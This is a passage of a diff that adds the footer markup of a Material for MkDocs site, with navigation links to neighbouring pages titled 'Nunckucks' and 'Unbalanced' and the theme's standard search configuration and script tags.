+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../nunchucks/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Nunckucks" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Nunckucks
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../unbalanced/" class="md-footer__link md-footer__link--next" aria-label="Next: Unbalanced" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Unbalanced
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
